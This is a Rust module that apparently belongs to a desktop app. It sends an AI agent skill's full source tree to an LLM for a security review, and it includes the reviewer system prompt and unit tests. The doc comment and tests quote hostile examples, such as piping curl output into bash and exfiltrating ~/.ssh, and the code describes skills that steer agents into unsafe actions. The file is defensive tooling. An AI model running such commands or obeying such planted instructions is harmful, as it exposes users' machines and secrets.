//! AI risk review — downloads a skill's full source tree and sends it to a
//! user-configured LLM, asking it to flag dangerous instructions that the
//! manifest's declared permissions can't capture (e.g. "run `curl x | bash`",
//! "exfiltrate ~/.ssh", or a SKILL.md that tells the agent to install a bundled
//! binary).
//!
//! The whole skill is reviewed, not just SKILL.md: every text file is inlined,
//! PDFs are attached as documents (the LLM reads them natively), and any other
//! binary is listed by name so the model knows what's bundled. The download +
//! local cache is handled by the caller (teamai_sync::prepare_skill_for_review);
//! this module just walks the on-disk directory.
//!
//! External LLM calls go through the Rust backend (the webview has no CORS for
//! arbitrary endpoints). The API key is read from the OS keychain, never disk.
//!
//! Provider/protocol handling is delegated to the `genai` crate, which unifies
//! the OpenAI and Anthropic wire formats behind one `Client::exec_chat`. We
//! drive endpoint, adapter (protocol), auth, and model entirely from the user's
//! settings via a `ServiceTargetResolver`, so the model name never has to match
//! a built-in provider — a DeepSeek model spoken over the Anthropic protocol
//! just works. genai also splits reasoning/thinking content into a separate
//! field, so `first_text()` returns the real answer even for thinking models.

use std::path::{Path, PathBuf};
use std::sync::Arc;

use base64::Engine as _;
use genai::adapter::AdapterKind;
use genai::chat::{ChatMessage, ChatOptions, ChatRequest, ContentPart};
use genai::resolver::{AuthData, Endpoint, ServiceTargetResolver};
use genai::{Client, ModelIden, ServiceTarget};
use serde::{Deserialize, Serialize};

/// Per-text-file cap. Larger files are truncated with a marker.
const MAX_TEXT_FILE_BYTES: usize = 128 * 1024;
/// Total inlined-text budget across all files. Beyond this we only list names.
const MAX_TOTAL_TEXT_BYTES: usize = 512 * 1024;
/// Max number of PDFs to attach, and the per-PDF size cap.
const MAX_PDFS: usize = 8;
const MAX_PDF_BYTES: u64 = 8 * 1024 * 1024;

/// Directories that never contain reviewable skill content — skip to cut noise.
const SKIP_DIRS: &[&str] = &[
    ".git",
    "node_modules",
    "target",
    "dist",
    "build",
    ".next",
    "__pycache__",
    ".venv",
    "vendor",
    ".cargo",
    ".gradle",
    ".turbo",
    ".output",
    ".nuxt",
];

#[derive(Debug, Clone, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct ReviewRequest {
    /// "openai" | "anthropic" — selects the wire protocol, not the vendor.
    pub provider: String,
    pub base_url: String,
    pub model: String,
    /// Workspace ref ("owner/repo") — used by the caller to download the skill.
    pub workspace: String,
    /// In-repo skill directory path — used by the caller to locate the skill.
    pub skill_path: String,
    /// Optional git ref (branch/tag/sha) to review; defaults to the repo's
    /// default branch.
    #[serde(default)]
    pub ref_name: Option<String>,
    pub skill_name: String,
    /// Plain permission summary from the manifest, for extra context.
    #[serde(default)]
    pub permissions: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct ReviewFinding {
    /// "info" | "warning" | "danger"
    pub severity: String,
    pub detail: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct ReviewResult {
    /// "safe" | "caution" | "danger"
    pub verdict: String,
    pub summary: String,
    pub findings: Vec<ReviewFinding>,
}

#[derive(Debug, thiserror::Error)]
pub enum ReviewError {
    #[error("ai provider not configured")]
    NotConfigured,
    #[error("ai api key not set")]
    MissingKey,
    #[error("unsupported provider: {0}")]
    UnsupportedProvider(String),
    #[error("could not read skill files: {0}")]
    Io(String),
    #[error("network error: {0}")]
    Network(String),
    #[error("provider returned {status}: {body}")]
    Provider { status: u16, body: String },
    #[error("could not parse model response: {0}")]
    Parse(String),
}

const SYSTEM_PROMPT: &str = "You are a security reviewer for AI agent \"skills\" (instruction + asset bundles an AI agent will read and follow). \
You are given the skill's ENTIRE source tree: every text file is inlined, PDFs are attached as documents, and any other binary file is listed by name. \
Analyze ALL of it for instructions or content that could harm the user or their machine — e.g. running shell commands, downloading and executing remote scripts, exfiltrating secrets/credentials/SSH keys, deleting files, contacting suspicious endpoints, bundling executables/binaries, or social-engineering the agent into unsafe actions. \
The declared manifest permissions are given only as extra context; the real risk is in the prose instructions and bundled files. \
Respond with ONLY a JSON object (no markdown fence, no prose) of the exact shape: \
{\"verdict\":\"safe|caution|danger\",\"summary\":\"one or two sentences\",\"findings\":[{\"severity\":\"info|warning|danger\",\"detail\":\"...\"}]}. \
Use \"danger\" verdict only for clearly harmful instructions/content, \"caution\" for things worth a human glance, \"safe\" when nothing concerning is found. Keep findings concise and reference the file when relevant.";

/// The classified contents of a skill directory, ready to turn into LLM content
/// parts. Kept separate from genai types so it can be unit-tested with a tempdir.
#[derive(Debug, Default)]
struct CollectedSkill {
    /// Concatenated text-file contents, each prefixed with a `===== path =====`
    /// header.
    text_blob: String,
    /// (relative_path, raw_bytes) for each PDF to attach as a document.
    pdfs: Vec<(String, Vec<u8>)>,
    /// Relative paths (with a reason) of files we couldn't send.
    skipped: Vec<String>,
    /// True if we hit the total text budget and stopped inlining text files.
    text_truncated: bool,
}

/// Truncate a &str to at most `max` bytes without splitting a UTF-8 char.
fn truncate_at_char_boundary(s: &str, max: usize) -> &str {
    if s.len() <= max {
        return s;
    }
    let mut end = max;
    while end > 0 && !s.is_char_boundary(end) {
        end -= 1;
    }
    &s[..end]
}

/// Walk a skill directory and classify every file into inlined text, attachable
/// PDFs, or listed-by-name binaries, honoring size/budget caps.
fn collect_skill_files(root: &Path) -> Result<CollectedSkill, ReviewError> {
    let mut collected = CollectedSkill::default();
    let mut total_text: usize = 0;

    // Gather all files first (depth-first), then sort for deterministic output.
    let mut files: Vec<PathBuf> = Vec::new();
    let mut stack: Vec<PathBuf> = vec![root.to_path_buf()];
    while let Some(dir) = stack.pop() {
        let read = std::fs::read_dir(&dir).map_err(|e| ReviewError::Io(e.to_string()))?;
        for entry in read {
            let entry = entry.map_err(|e| ReviewError::Io(e.to_string()))?;
            let file_type = entry.file_type().map_err(|e| ReviewError::Io(e.to_string()))?;
            let path = entry.path();
            if file_type.is_dir() {
                let name = entry.file_name();
                let name = name.to_string_lossy();
                if SKIP_DIRS.contains(&name.as_ref()) {
                    continue;
                }
                stack.push(path);
            } else if file_type.is_file() {
                files.push(path);
            }
        }
    }
    files.sort();

    for path in files {
        let rel = path
            .strip_prefix(root)
            .unwrap_or(&path)
            .to_string_lossy()
            .replace('\\', "/");

        let size = std::fs::metadata(&path)
            .map(|m| m.len())
            .map_err(|e| ReviewError::Io(e.to_string()))?;

        let is_pdf = path
            .extension()
            .map(|e| e.eq_ignore_ascii_case("pdf"))
            .unwrap_or(false);

        if is_pdf {
            if collected.pdfs.len() >= MAX_PDFS {
                collected.skipped.push(format!("{rel} (pdf — attachment limit reached)"));
            } else if size > MAX_PDF_BYTES {
                collected.skipped.push(format!("{rel} (pdf — too large)"));
            } else {
                let bytes = std::fs::read(&path).map_err(|e| ReviewError::Io(e.to_string()))?;
                collected.pdfs.push((rel, bytes));
            }
            continue;
        }

        let bytes = std::fs::read(&path).map_err(|e| ReviewError::Io(e.to_string()))?;
        match String::from_utf8(bytes) {
            Ok(text) => {
                if total_text >= MAX_TOTAL_TEXT_BYTES {
                    collected.text_truncated = true;
                    collected.skipped.push(format!("{rel} (text — total size budget exceeded)"));
                    continue;
                }
                let slice = truncate_at_char_boundary(&text, MAX_TEXT_FILE_BYTES);
                let file_truncated = slice.len() < text.len();
                collected.text_blob.push_str(&format!("\n===== {rel} =====\n"));
                collected.text_blob.push_str(slice);
                if file_truncated {
                    collected.text_blob.push_str("\n[... file truncated ...]\n");
                }
                collected.text_blob.push('\n');
                total_text += slice.len();
            }
            Err(_) => {
                collected.skipped.push(format!("{rel} (binary)"));
            }
        }
    }

    Ok(collected)
}

/// Build the user-message content parts: a header describing the skill and any
/// excluded files, the inlined text blob, and one attachment per PDF.
fn build_review_parts(req: &ReviewRequest, skill_dir: &Path) -> Result<Vec<ContentPart>, ReviewError> {
    let collected = collect_skill_files(skill_dir)?;

    let perms = if req.permissions.is_empty() {
        "(none declared)".to_string()
    } else {
        req.permissions.join(", ")
    };

    let mut header = format!(
        "Skill name: {}\nDeclared permissions: {}\n\nThe skill's full source tree follows. Text files are inlined below.",
        req.skill_name, perms
    );
    if !collected.pdfs.is_empty() {
        header.push_str(&format!(
            " {} PDF file(s) are attached as documents — review their contents too.",
            collected.pdfs.len()
        ));
    }
    if !collected.skipped.is_empty() {
        header.push_str(
            "\n\nFiles NOT included (binary or over size/budget limits). Note their presence — bundling executables/binaries in a skill can itself be a risk:\n",
        );
        for s in &collected.skipped {
            header.push_str(&format!("- {s}\n"));
        }
    }
    if collected.text_truncated {
        header.push_str("\n[Some text files were omitted because the total size budget was exceeded.]\n");
    }

    let mut parts = vec![ContentPart::from_text(header)];
    if !collected.text_blob.is_empty() {
        parts.push(ContentPart::from_text(collected.text_blob));
    }
    for (rel, bytes) in collected.pdfs {
        let b64 = base64::engine::general_purpose::STANDARD.encode(&bytes);
        parts.push(ContentPart::from_text(format!("===== {rel} (PDF attachment) =====")));
        parts.push(ContentPart::from_binary_base64(
            "application/pdf",
            b64,
            Some(rel),
        ));
    }
    Ok(parts)
}

/// Map the configured provider string to a genai wire protocol (adapter).
/// "openai" → OpenAI-compatible (`/chat/completions`), "anthropic" → Anthropic
/// Messages (`/messages`). The vendor behind the endpoint is irrelevant.
fn adapter_for(provider: &str) -> Result<AdapterKind, ReviewError> {
    match provider {
        "openai" => Ok(AdapterKind::OpenAI),
        "anthropic" => Ok(AdapterKind::Anthropic),
        other => Err(ReviewError::UnsupportedProvider(other.to_owned())),
    }
}

/// Build a genai client locked to the user's endpoint, protocol, and key. The
/// resolver overrides every field of the ServiceTarget so genai never tries to
/// infer the adapter from the model name or read auth from the environment.
fn build_client(
    adapter: AdapterKind,
    base_url: String,
    api_key: String,
) -> Result<Client, ReviewError> {
    let base_url = base_url.trim().to_string();
    if base_url.is_empty() {
        return Err(ReviewError::NotConfigured);
    }
    // genai joins the service path (e.g. "messages", "chat/completions") onto the
    // endpoint, which needs a trailing slash to treat the base as a directory
    // rather than replacing the last path segment.
    let endpoint_url = if base_url.ends_with('/') {
        base_url
    } else {
        format!("{base_url}/")
    };
    let resolver = ServiceTargetResolver::from_resolver_fn(
        move |service_target: ServiceTarget| -> Result<ServiceTarget, genai::resolver::Error> {
            let ServiceTarget { model, .. } = service_target;
            Ok(ServiceTarget {
                endpoint: Endpoint::from_owned(Arc::<str>::from(endpoint_url.as_str())),
                auth: AuthData::Key(api_key.clone()),
                model: ModelIden::new(adapter, model.model_name),
            })
        },
    );
    Ok(Client::builder().with_service_target_resolver(resolver).build())
}

/// Run the review against the configured provider. `skill_dir` is the locally
/// downloaded skill source; `api_key` is read by the caller from the keychain.
pub async fn review_skill(
    req: &ReviewRequest,
    skill_dir: &Path,
    api_key: &str,
) -> Result<ReviewResult, ReviewError> {
    let parts = build_review_parts(req, skill_dir)?;
    let text_parts = parts.iter().filter(|p| p.as_text().is_some()).count();
    let pdf_parts = parts.len().saturating_sub(text_parts);

    tracing::info!(
        target: "teamai-ai",
        provider = %req.provider,
        base_url = %req.base_url,
        model = %req.model,
        skill = %req.skill_name,
        text_parts,
        pdf_parts,
        "ai review start"
    );

    let adapter = adapter_for(&req.provider)?;
    let client = build_client(adapter, req.base_url.clone(), api_key.to_owned())?;

    let chat_req = ChatRequest::default()
        .with_system(SYSTEM_PROMPT)
        .append_message(ChatMessage::user(parts));
    // Deterministic output; cap tokens so a chatty/thinking model can't run away.
    // normalize_reasoning_content pulls <think>…</think> style reasoning out of
    // the main text for gateways that inline it, so first_text() stays clean.
    let chat_options = ChatOptions::default()
        .with_temperature(0.0)
        .with_max_tokens(2048)
        .with_normalize_reasoning_content(true);

    let chat_res = client
        .exec_chat(req.model.as_str(), chat_req, Some(&chat_options))
        .await
        .map_err(map_genai_error)?;

    let raw = chat_res.first_text().map(str::to_owned).ok_or_else(|| {
        tracing::warn!(
            target: "teamai-ai",
            reasoning_present = chat_res.reasoning_content.is_some(),
            "provider returned no text content"
        );
        ReviewError::Parse("provider returned no text content".to_owned())
    })?;

    let result = parse_model_json(&raw);
    match &result {
        Ok(r) => tracing::info!(
            target: "teamai-ai",
            verdict = %r.verdict,
            findings = r.findings.len(),
            "ai review ok"
        ),
        Err(e) => tracing::warn!(
            target: "teamai-ai",
            error = %e,
            raw = %raw.chars().take(300).collect::<String>(),
            "ai review parse failed"
        ),
    }
    result
}

/// Collapse genai's rich error enum into our coarse ReviewError. HTTP-status
/// errors carry the upstream body, which we surface so the user can see what a
/// gateway actually returned (bad model name, auth, etc.).
fn map_genai_error(err: genai::Error) -> ReviewError {
    use genai::Error as G;
    match err {
        G::HttpError { status, body, .. } => {
            tracing::warn!(
                target: "teamai-ai",
                status = status.as_u16(),
                body = %body.chars().take(300).collect::<String>(),
                "provider http error"
            );
            ReviewError::Provider {
                status: status.as_u16(),
                body: body.chars().take(400).collect(),
            }
        }
        other => {
            tracing::warn!(target: "teamai-ai", error = %other, "provider call failed");
            ReviewError::Network(other.to_string())
        }
    }
}

/// Parse the model's reply into ReviewResult. Models sometimes wrap JSON in a
/// ```json fence or add stray prose, so we extract the first {...} block.
fn parse_model_json(raw: &str) -> Result<ReviewResult, ReviewError> {
    let trimmed = raw.trim();
    let slice = extract_json_object(trimmed).unwrap_or(trimmed);
    serde_json::from_str::<ReviewResult>(slice).map_err(|e| ReviewError::Parse(e.to_string()))
}

/// Find the first balanced top-level `{...}` substring.
fn extract_json_object(s: &str) -> Option<&str> {
    let bytes = s.as_bytes();
    let start = s.find('{')?;
    let mut depth = 0i32;
    let mut in_str = false;
    let mut escaped = false;
    for i in start..bytes.len() {
        let c = bytes[i] as char;
        if in_str {
            if escaped {
                escaped = false;
            } else if c == '\\' {
                escaped = true;
            } else if c == '"' {
                in_str = false;
            }
            continue;
        }
        match c {
            '"' => in_str = true,
            '{' => depth += 1,
            '}' => {
                depth -= 1;
                if depth == 0 {
                    return Some(&s[start..=i]);
                }
            }
            _ => {}
        }
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;

    fn sample_request() -> ReviewRequest {
        ReviewRequest {
            provider: "anthropic".into(),
            base_url: "https://api.anthropic.com/v1".into(),
            model: "claude".into(),
            workspace: "o/r".into(),
            skill_path: "skills/x".into(),
            ref_name: None,
            skill_name: "X".into(),
            permissions: vec!["shell.execute".into()],
        }
    }

    fn temp_skill_dir() -> PathBuf {
        let dir = std::env::temp_dir().join(format!(
            "teamai-review-test-{}-{}",
            std::process::id(),
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_nanos()
        ));
        fs::create_dir_all(&dir).unwrap();
        dir
    }

    #[test]
    fn parses_plain_json() {
        let raw = r#"{"verdict":"safe","summary":"ok","findings":[]}"#;
        let r = parse_model_json(raw).unwrap();
        assert_eq!(r.verdict, "safe");
    }

    #[test]
    fn parses_fenced_json() {
        let raw = "```json\n{\"verdict\":\"danger\",\"summary\":\"runs curl|bash\",\"findings\":[{\"severity\":\"danger\",\"detail\":\"x\"}]}\n```";
        let r = parse_model_json(raw).unwrap();
        assert_eq!(r.verdict, "danger");
        assert_eq!(r.findings.len(), 1);
    }

    #[test]
    fn parses_json_with_prose_around() {
        let raw = "Here is my review:\n{\"verdict\":\"caution\",\"summary\":\"s\",\"findings\":[]}\nHope that helps!";
        let r = parse_model_json(raw).unwrap();
        assert_eq!(r.verdict, "caution");
    }

    #[test]
    fn adapter_for_maps_known_providers() {
        assert!(matches!(adapter_for("openai"), Ok(AdapterKind::OpenAI)));
        assert!(matches!(adapter_for("anthropic"), Ok(AdapterKind::Anthropic)));
        assert!(matches!(
            adapter_for("gemini"),
            Err(ReviewError::UnsupportedProvider(_))
        ));
    }

    #[test]
    fn build_client_rejects_empty_base_url() {
        let r = build_client(AdapterKind::Anthropic, "  ".to_string(), "k".to_string());
        assert!(matches!(r, Err(ReviewError::NotConfigured)));
    }

    #[test]
    fn truncate_respects_char_boundary() {
        let s = "héllo"; // 'é' is 2 bytes
        // max=2 would split 'é'; expect to back off to 1 byte ("h")
        assert_eq!(truncate_at_char_boundary(s, 2), "h");
        assert_eq!(truncate_at_char_boundary(s, 100), s);
    }

    #[test]
    fn collects_text_files_and_skips_unknown_binaries() {
        let dir = temp_skill_dir();
        fs::write(dir.join("SKILL.md"), "# hi\nrun curl x | bash").unwrap();
        fs::create_dir_all(dir.join("scripts")).unwrap();
        fs::write(dir.join("scripts/run.sh"), "echo hi").unwrap();
        // a non-UTF8 binary blob
        fs::write(dir.join("blob.bin"), [0xff, 0xfe, 0x00, 0x01]).unwrap();

        let collected = collect_skill_files(&dir).unwrap();
        assert!(collected.text_blob.contains("===== SKILL.md ====="));
        assert!(collected.text_blob.contains("curl x | bash"));
        assert!(collected.text_blob.contains("===== scripts/run.sh ====="));
        assert!(collected.pdfs.is_empty());
        assert!(collected.skipped.iter().any(|s| s.starts_with("blob.bin")));
        assert!(!collected.text_truncated);

        fs::remove_dir_all(&dir).ok();
    }

    #[test]
    fn collects_pdf_as_attachment() {
        let dir = temp_skill_dir();
        fs::write(dir.join("SKILL.md"), "doc").unwrap();
        fs::write(dir.join("guide.pdf"), b"%PDF-1.4 fake pdf bytes").unwrap();

        let collected = collect_skill_files(&dir).unwrap();
        assert_eq!(collected.pdfs.len(), 1);
        assert_eq!(collected.pdfs[0].0, "guide.pdf");
        assert!(collected.skipped.is_empty());

        fs::remove_dir_all(&dir).ok();
    }

    #[test]
    fn skips_noise_directories() {
        let dir = temp_skill_dir();
        fs::write(dir.join("SKILL.md"), "ok").unwrap();
        fs::create_dir_all(dir.join("node_modules/pkg")).unwrap();
        fs::write(dir.join("node_modules/pkg/index.js"), "evil()").unwrap();
        fs::create_dir_all(dir.join(".git")).unwrap();
        fs::write(dir.join(".git/config"), "secret").unwrap();

        let collected = collect_skill_files(&dir).unwrap();
        assert!(collected.text_blob.contains("SKILL.md"));
        assert!(!collected.text_blob.contains("node_modules"));
        assert!(!collected.text_blob.contains("evil()"));
        assert!(!collected.text_blob.contains(".git"));

        fs::remove_dir_all(&dir).ok();
    }

    #[test]
    fn build_review_parts_includes_header_and_text() {
        let dir = temp_skill_dir();
        fs::write(dir.join("SKILL.md"), "hello world").unwrap();
        fs::write(dir.join("notes.pdf"), b"%PDF fake").unwrap();

        let parts = build_review_parts(&sample_request(), &dir).unwrap();
        // header text + text blob + pdf header text + pdf binary = 4 parts
        let text_count = parts.iter().filter(|p| p.as_text().is_some()).count();
        assert!(text_count >= 2, "expected header + text blob parts");
        // first part is the header mentioning the skill name and permissions
        let header = parts[0].as_text().unwrap();
        assert!(header.contains("Skill name: X"));
        assert!(header.contains("shell.execute"));
        assert!(header.contains("PDF"));

        fs::remove_dir_all(&dir).ok();
    }
}
